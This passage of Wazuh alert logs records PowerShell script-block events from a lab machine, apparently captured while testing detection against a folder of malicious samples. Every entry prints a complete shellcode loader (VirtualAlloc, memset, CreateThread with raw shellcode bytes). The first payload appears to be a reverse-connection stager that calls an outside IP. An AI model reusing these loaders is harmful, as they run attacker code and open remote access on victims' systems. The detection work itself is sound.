0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x80,0x48,0x1c,0xd0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 507c773d-5a68-49a8-9234-734657ee18b6\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\128.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$c = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x80,0x48,0x1c,0xd0,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"507c773d-5a68-49a8-9234-734657ee18b6","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\128.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:17.928+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":20,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015597.405802","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:47.5474275Z","eventRecordID":"200802","processID":"2172","threadID":"5020","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$ZAl5 = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ZAl5 -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5e,0xbd,0xca,0x8a,0x52,0x62,0x33,0xc9,0xb1,0x58,0x31,0x6e,0x1a,0x83,0xee,0xfc,0x03,0x6e,0x16,0xe2,0x3f,0x76,0xba,0xe0,0xbf,0x87,0x3b,0x85,0x36,0x62,0x0a,0x85,0x2c,0xe6,0x3d,0x35,0x27,0xaa,0xb1,0xbe,0x65,0x5f,0x41,0xb2,0xa1,0x50,0xe2,0x79,0x97,0x5f,0xf3,0xd2,0xeb,0xfe,0x77,0x29,0x3f,0x21,0x49,0xe2,0x32,0x20,0x8e,0x1f,0xbe,0x70,0x47,0x6b,0x6c,0x65,0xec,0x21,0xac,0x0e,0xbe,0xa4,0xb4,0xf3,0x77,0xc6,0x95,0xa5,0x0c,0x91,0x35,0x47,0xc0,0xa9,0x7c,0x5f,0x05,0x97,0x37,0xd4,0xfd,0x63,0xc6,0x3c,0xcc,0x8c,0x64,0x01,0xe0,0x7e,0x75,0x45,0xc7,0x60,0x00,0xbf,0x3b,0x1c,0x12,0x04,0x41,0xfa,0x97,0x9f,0xe1,0x89,0x0f,0x44,0x13,0x5d,0xc9,0x0f,0x1f,0x2a,0x9e,0x48,0x3c,0xad,0x73,0xe3,0x38,0x26,0x72,0x24,0xc9,0x7c,0x50,0xe0,0x91,0x27,0xf9,0xb1,0x7f,0x89,0x06,0xa1,0xdf,0x76,0xa2,0xa9,0xf2,0x63,0xdf,0xf3,0x9a,0x1d,0xba,0x7f,0x5b,0x8a,0x33,0xe9,0x35,0x23,0xef,0x81,0x85,0xc4,0x29,0x55,0xe9,0xfe,0x04,0x82,0x46,0x52,0x35,0x67,0x3a,0x3c,0x83,0xd1,0xc5,0x1b,0x0c,0x08,0x66,0x37,0x98,0xb0,0xda,0xe4,0x34,0x14,0xd3,0x0a,0xc4,0xb2,0x60,0x0a,0xc4,0x42,0x56,0x4f,0x83,0x0a,0x91,0x1f,0x0b,0xdb,0x89,0xc8,0x82,0x44,0x8f,0x08,0x41,0xf3,0xd6,0xa4,0x01,0x04,0xe5,0xaa,0x55,0x57,0x5a,0x78,0x02,0x0b,0x0a,0x16,0x47,0xfe,0x9c,0xdd,0x68,0xd4,0x77,0x4b,0x9c,0x88,0x1f,0x0c,0x93,0x36,0xe0,0x85,0x33,0x5c,0xe4,0xc5,0xd9,0xbe,0xb2,0x8d,0x68,0x87,0xa4,0xc8,0x6d,0xd2,0x8a,0x87,0xc2,0x8e,0x7a,0x40,0xc9,0x36,0x9b,0xeb,0xee,0xe2,0x1e,0xcb,0x65,0x07,0x6e,0xb9,0x5c,0x7f,0x80,0xf4,0xfc,0xd6,0x9f,0x22,0x6a,0x97,0x37,0xcd,0x7a,0x17,0xc8,0xa5,0x7a,0x17,0x88,0x35,0x29,0x7f,0x50,0x92,0x9e,0x9a,0x9f,0x0f,0xb3,0x36,0x33,0x39,0x54,0xef,0xdb,0x39,0xba,0x10,0x1c,0x69,0xec,0x78,0x0e,0x1b,0x99,0x9b,0xd1,0xf6,0x1c,0x9b,0x5a,0x34,0x95,0x1b,0xa2,0x05,0x2c,0xe3,0xd1,0x6c,0x76,0x27,0x46,0x87,0xf3,0x58,0x86,0xa8,0x8c,0xd1,0x0e,0x64,0x5c,0x7d,0x99,0xf8,0xcf,0xec,0x3c,0xd0,0x7a,0x9f,0x90,0x4e,0xe5,0x2b,0x88,0x8e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$bVz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($bVz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$bVz,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: c495cefb-777b-4653-9798-13b1ddb51096\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1282.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$ZAl5 = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $ZAl5 -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xce,0xd9,0x74,0x24,0xf4,0x5e,0xbd,0xca,0x8a,0x52,0x62,0x33,0xc9,0xb1,0x58,0x31,0x6e,0x1a,0x83,0xee,0xfc,0x03,0x6e,0x16,0xe2,0x3f,0x76,0xba,0xe0,0xbf,0x87,0x3b,0x85,0x36,0x62,0x0a,0x85,0x2c,0xe6,0x3d,0x35,0x27,0xaa,0xb1,0xbe,0x65,0x5f,0x41,0xb2,0xa1,0x50,0xe2,0x79,0x97,0x5f,0xf3,0xd2,0xeb,0xfe,0x77,0x29,0x3f,0x21,0x49,0xe2,0x32,0x20,0x8e,0x1f,0xbe,0x70,0x47,0x6b,0x6c,0x65,0xec,0x21,0xac,0x0e,0xbe,0xa4,0xb4,0xf3,0x77,0xc6,0x95,0xa5,0x0c,0x91,0x35,0x47,0xc0,0xa9,0x7c,0x5f,0x05,0x97,0x37,0xd4,0xfd,0x63,0xc6,0x3c,0xcc,0x8c,0x64,0x01,0xe0,0x7e,0x75,0x45,0xc7,0x60,0x00,0xbf,0x3b,0x1c,0x12,0x04,0x41,0xfa,0x97,0x9f,0xe1,0x89,0x0f,0x44,0x13,0x5d,0xc9,0x0f,0x1f,0x2a,0x9e,0x48,0x3c,0xad,0x73,0xe3,0x38,0x26,0x72,0x24,0xc9,0x7c,0x50,0xe0,0x91,0x27,0xf9,0xb1,0x7f,0x89,0x06,0xa1,0xdf,0x76,0xa2,0xa9,0xf2,0x63,0xdf,0xf3,0x9a,0x1d,0xba,0x7f,0x5b,0x8a,0x33,0xe9,0x35,0x23,0xef,0x81,0x85,0xc4,0x29,0x55,0xe9,0xfe,0x04,0x82,0x46,0x52,0x35,0x67,0x3a,0x3c,0x83,0xd1,0xc5,0x1b,0x0c,0x08,0x66,0x37,0x98,0xb0,0xda,0xe4,0x34,0x14,0xd3,0x0a,0xc4,0xb2,0x60,0x0a,0xc4,0x42,0x56,0x4f,0x83,0x0a,0x91,0x1f,0x0b,0xdb,0x89,0xc8,0x82,0x44,0x8f,0x08,0x41,0xf3,0xd6,0xa4,0x01,0x04,0xe5,0xaa,0x55,0x57,0x5a,0x78,0x02,0x0b,0x0a,0x16,0x47,0xfe,0x9c,0xdd,0x68,0xd4,0x77,0x4b,0x9c,0x88,0x1f,0x0c,0x93,0x36,0xe0,0x85,0x33,0x5c,0xe4,0xc5,0xd9,0xbe,0xb2,0x8d,0x68,0x87,0xa4,0xc8,0x6d,0xd2,0x8a,0x87,0xc2,0x8e,0x7a,0x40,0xc9,0x36,0x9b,0xeb,0xee,0xe2,0x1e,0xcb,0x65,0x07,0x6e,0xb9,0x5c,0x7f,0x80,0xf4,0xfc,0xd6,0x9f,0x22,0x6a,0x97,0x37,0xcd,0x7a,0x17,0xc8,0xa5,0x7a,0x17,0x88,0x35,0x29,0x7f,0x50,0x92,0x9e,0x9a,0x9f,0x0f,0xb3,0x36,0x33,0x39,0x54,0xef,0xdb,0x39,0xba,0x10,0x1c,0x69,0xec,0x78,0x0e,0x1b,0x99,0x9b,0xd1,0xf6,0x1c,0x9b,0x5a,0x34,0x95,0x1b,0xa2,0x05,0x2c,0xe3,0xd1,0x6c,0x76,0x27,0x46,0x87,0xf3,0x58,0x86,0xa8,0x8c,0xd1,0x0e,0x64,0x5c,0x7d,0x99,0xf8,0xcf,0xec,0x3c,0xd0,0x7a,0x9f,0x90,0x4e,0xe5,0x2b,0x88,0x8e;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$bVz=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($bVz.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$bVz,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"c495cefb-777b-4653-9798-13b1ddb51096","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1282.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:20.519+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":21,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015600.418558","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:50.0930233Z","eventRecordID":"200811","processID":"11996","threadID":"9160","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$oTvt = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $oTvt -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x42,0x8c,0x13,0x6b,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x55,0x0f,0x03,0x55,0x4d,0x6e,0xe6,0x97,0xb9,0xec,0x09,0x68,0x39,0x91,0x80,0x8d,0x08,0x91,0xf7,0xc6,0x3a,0x21,0x73,0x8a,0xb6,0xca,0xd1,0x3f,0x4d,0xbe,0xfd,0x30,0xe6,0x75,0xd8,0x7f,0xf7,0x26,0x18,0xe1,0x7b,0x35,0x4d,0xc1,0x42,0xf6,0x80,0x00,0x83,0xeb,0x69,0x50,0x5c,0x67,0xdf,0x45,0xe9,0x3d,0xdc,0xee,0xa1,0xd0,0x64,0x12,0x71,0xd2,0x45,0x85,0x0a,0x8d,0x45,0x27,0xdf,0xa5,0xcf,0x3f,0x3c,0x83,0x86,0xb4,0xf6,0x7f,0x19,0x1d,0xc7,0x80,0xb6,0x60,0xe8,0x72,0xc6,0xa5,0xce,0x6c,0xbd,0xdf,0x2d,0x10,0xc6,0x1b,0x4c,0xce,0x43,0xb8,0xf6,0x85,0xf4,0x64,0x07,0x49,0x62,0xee,0x0b,0x26,0xe0,0xa8,0x0f,0xb9,0x25,0xc3,0x2b,0x32,0xc8,0x04,0xba,0x00,0xef,0x80,0xe7,0xd3,0x8e,0x91,0x4d,0xb5,0xaf,0xc2,0x2e,0x6a,0x0a,0x88,0xc2,0x7f,0x27,0xd3,0x8a,0x4c,0x0a,0xec,0x4a,0xdb,0x1d,0x9f,0x78,0x44,0xb6,0x37,0x30,0x0d,0x10,0xcf,0x37,0x24,0xe4,0x5f,0xc6,0xc7,0x15,0x49,0x0c,0x93,0x45,0xe1,0xa5,0x9c,0x0d,0xf1,0x4a,0x49,0xbb,0xf4,0xdc,0x78,0x3c,0xfd,0x12,0x15,0x3e,0x01,0x3b,0xb9,0xb7,0xe7,0x6b,0x11,0x98,0xb7,0xcb,0xc1,0x58,0x68,0xa3,0x0b,0x57,0x57,0xd3,0x33,0xbd,0xf0,0x79,0xdc,0x68,0xa8,0x15,0x45,0x31,0x22,0x84,0x8a,0xef,0x4e,0x86,0x01,0x1c,0xae,0x48,0xe2,0x69,0xbc,0x3c,0x02,0x24,0x9e,0xea,0x1d,0x92,0xb5,0x12,0x88,0x19,0x1c,0x45,0x24,0x20,0x79,0xa1,0xeb,0xdb,0xac,0xba,0x22,0x4e,0x0f,0xd4,0x4a,0x9e,0x8f,0x24,0x1d,0xf4,0x8f,0x4c,0xf9,0xac,0xc3,0x69,0x06,0x79,0x70,0x22,0x93,0x82,0x21,0x97,0x34,0xeb,0xcf,0xce,0x73,0xb4,0x30,0x25,0x82,0x88,0xe6,0x03,0xf0,0xe0,0x3a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6bu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6bu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6bu,0,0,0);for (;;){Start-sleep 60};\r\n\r\nScriptBlock ID: 65a325e7-2b34-4b12-89cf-2169fe58564e\r\nPath: C:\\TA\\project-ta\\data_spliting\\test_set\\malicious\\1296.ps1\""},"eventdata":{"messageNumber":"1","messageTotal":"1","scriptBlockText":"$oTvt = '[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\\\"kernel32.dll\\\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\\\"msvcrt.dll\\\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $oTvt -Name \\\"Win32\\\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xba,0x42,0x8c,0x13,0x6b,0xdb,0xc8,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x83,0xc5,0x04,0x31,0x55,0x0f,0x03,0x55,0x4d,0x6e,0xe6,0x97,0xb9,0xec,0x09,0x68,0x39,0x91,0x80,0x8d,0x08,0x91,0xf7,0xc6,0x3a,0x21,0x73,0x8a,0xb6,0xca,0xd1,0x3f,0x4d,0xbe,0xfd,0x30,0xe6,0x75,0xd8,0x7f,0xf7,0x26,0x18,0xe1,0x7b,0x35,0x4d,0xc1,0x42,0xf6,0x80,0x00,0x83,0xeb,0x69,0x50,0x5c,0x67,0xdf,0x45,0xe9,0x3d,0xdc,0xee,0xa1,0xd0,0x64,0x12,0x71,0xd2,0x45,0x85,0x0a,0x8d,0x45,0x27,0xdf,0xa5,0xcf,0x3f,0x3c,0x83,0x86,0xb4,0xf6,0x7f,0x19,0x1d,0xc7,0x80,0xb6,0x60,0xe8,0x72,0xc6,0xa5,0xce,0x6c,0xbd,0xdf,0x2d,0x10,0xc6,0x1b,0x4c,0xce,0x43,0xb8,0xf6,0x85,0xf4,0x64,0x07,0x49,0x62,0xee,0x0b,0x26,0xe0,0xa8,0x0f,0xb9,0x25,0xc3,0x2b,0x32,0xc8,0x04,0xba,0x00,0xef,0x80,0xe7,0xd3,0x8e,0x91,0x4d,0xb5,0xaf,0xc2,0x2e,0x6a,0x0a,0x88,0xc2,0x7f,0x27,0xd3,0x8a,0x4c,0x0a,0xec,0x4a,0xdb,0x1d,0x9f,0x78,0x44,0xb6,0x37,0x30,0x0d,0x10,0xcf,0x37,0x24,0xe4,0x5f,0xc6,0xc7,0x15,0x49,0x0c,0x93,0x45,0xe1,0xa5,0x9c,0x0d,0xf1,0x4a,0x49,0xbb,0xf4,0xdc,0x78,0x3c,0xfd,0x12,0x15,0x3e,0x01,0x3b,0xb9,0xb7,0xe7,0x6b,0x11,0x98,0xb7,0xcb,0xc1,0x58,0x68,0xa3,0x0b,0x57,0x57,0xd3,0x33,0xbd,0xf0,0x79,0xdc,0x68,0xa8,0x15,0x45,0x31,0x22,0x84,0x8a,0xef,0x4e,0x86,0x01,0x1c,0xae,0x48,0xe2,0x69,0xbc,0x3c,0x02,0x24,0x9e,0xea,0x1d,0x92,0xb5,0x12,0x88,0x19,0x1c,0x45,0x24,0x20,0x79,0xa1,0xeb,0xdb,0xac,0xba,0x22,0x4e,0x0f,0xd4,0x4a,0x9e,0x8f,0x24,0x1d,0xf4,0x8f,0x4c,0xf9,0xac,0xc3,0x69,0x06,0x79,0x70,0x22,0x93,0x82,0x21,0x97,0x34,0xeb,0xcf,0xce,0x73,0xb4,0x30,0x25,0x82,0x88,0xe6,0x03,0xf0,0xe0,0x3a;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$6bu=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($6bu.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$6bu,0,0,0);for (;;){Start-sleep 60};","scriptBlockId":"65a325e7-2b34-4b12-89cf-2169fe58564e","path":"C:\\\\TA\\\\project-ta\\\\data_spliting\\\\test_set\\\\malicious\\\\1296.ps1"}}},"location":"EventChannel"}
{"timestamp":"2026-07-14T07:53:20.568+0000","rule":{"level":10,"description":"Powershell script may be executing suspicious code with CreateThread API","id":"91810","mitre":{"id":["T1106"],"tactic":["Execution"],"technique":["Native API"]},"firedtimes":22,"mail":false,"groups":["windows"," powershell"]},"agent":{"id":"002","name":"DESKTOP-BAC9DBQ","ip":"192.168.1.12"},"manager":{"name":"wazuh-server"},"id":"1784015600.429916","decoder":{"name":"windows_eventchannel"},"data":{"win":{"system":{"providerName":"Microsoft-Windows-PowerShell","providerGuid":"{a0c1853b-5c40-4b15-8766-3cf1c58f985a}","eventID":"4104","version":"1","level":"3","task":"2","opcode":"15","keywords":"0x0","systemTime":"2026-07-14T07:53:51.0336177Z","eventRecordID":"200815","processID":"8428","threadID":"6468","channel":"Microsoft-Windows-PowerShell/Operational","computer":"DESKTOP-BAC9DBQ","severityValue":"WARNING","message":"\"Creating Scriptblock text (1 of 1):\r\n$c = '[DllImport(\"kernel32.dll\")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(\"kernel32.dll\")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(\"msvcrt.dll\")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name \"Win32\" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xdb,0xce,0xb8,0x6b,0xc1,0x00,0x44,0xd9,0x74,0x24,0xf4,0x5d,0x2b,0xc9,0xb1,0x47,0x31,0x45,0x18,0x03,0x45,0x18,0x83,0xed,0x97,0x23,0xf5,0xb8,0x8f,0x26,0xf6,0x40,0x4f,0x47,0x7e,0xa5,0x7e,0x47,0xe4,0xad,0xd0,0x77,0x6e,0xe3,0xdc,0xfc,0x22,0x10,0x57,0x70,0xeb,0x17,0xd0,0x3f,0xcd,0x16,0xe1,0x6c,0x2d,0x38,0x61,0x6f,0x62,0x9a,0x58,0xa0,0x77,0xdb,0x9d,0xdd,0x7a,0x89,0x76,0xa9,0x29,0x3e,0xf3,0xe7,0xf1,0xb5,0x4f,0xe9,0x71,0x29,0x07,0x08,0x53,0xfc,0x1c,0x53,0x73,0xfe,0xf1,0xef,0x3a,0x18,0x16,0xd5,0xf5,0x93,0xec,0xa1,0x07,0x72,0x3d,0x49,0xab,0xbb,0xf2,0xb8,0xb5,0xfc,0x34,0x23,0xc0,0xf4,0x47,0xde,0xd3,0xc2,0x3a,0x04,0x51,0xd1,0x9c,0xcf,0xc1,0x3d,0x1d,0x03,0x97,0xb6,0x11,0xe8,0xd3,0x91,0x35,0xef,0x30,0xaa,0x41,0x64,0xb7,0x7d,0xc0,0x3e,0x9c,0x59,0x89,0xe5,0xbd,0xf8,0x77,0x4b,0xc1,0x1b,0xd8,0x34,0x67,0x57,0xf4,0x21,0x1a,0x3a,0x90,0x86,0x17,0xc5,0x60,0x81,0x20,0xb6,0x52,0x0e,0x9b,0x50,0xde,0xc7,0x05,0xa6,0x21,0xf2,0xf2,0x38,0xdc,0xfd,0x02,0x10,0x1a,0xa9,0x52,0x0a,0x8b,0xd2,0x38,0xca,0x34,0x07,0xee,0x9a,0x9a,0xf8,0x4f,0x4b,0x5a,0xa9,0x27,0x81,0x55,0x96,0x58,0xaa,0xbc,0xbf,0xf3,0x50,0x56,0x81,0x6c,0xfe,0x1d,0x69,0x71,0x00,0x60,0xd1,0xfc,0xe6,0x08,0x35,0xa9,0xb1,0xa4,0xac,0xf0,0x4a,0x55,0x30,0x2f,0x37,0x55,0xba,0xdc,0xc7,0x1b,0x4b,0xa8,0xdb,0xcb,0xbb,0xe7,0x86,0x5d,0xc3,0xdd,0xad,0x61,0x51,0xda,0x67,0x36,0xcd,0xe0,0x5e,0x70,0x52,0x1a,0xb5,0x0b,0x5b,0x8e,0x76,0x63,0xa4,0x5e,0x77,0x73,0xf2,0x34,0x77,0x1b,0xa2,0x6c,0x24,0x3e,0xad,0xb8,0x58,0x93,0x38,0x43,0x09,0x40,0xea,0x2b,0xb7,0xbf,0xdc,0xf3,0